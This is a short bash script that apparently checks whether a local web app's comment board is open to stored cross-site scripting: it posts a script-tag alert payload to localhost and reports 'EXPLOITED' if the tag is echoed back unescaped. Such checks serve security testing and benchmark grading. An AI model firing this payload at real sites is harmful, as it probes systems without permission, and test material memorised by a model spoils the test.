#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-8000}"
curl -s -X POST "$BASE/comment" -d "text=%3Cscript%3Ealert(1)%3C%2Fscript%3E" > /dev/null
resp=$(curl -s "$BASE/board")
if echo "$resp" | grep -q "<script>alert(1)</script>"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
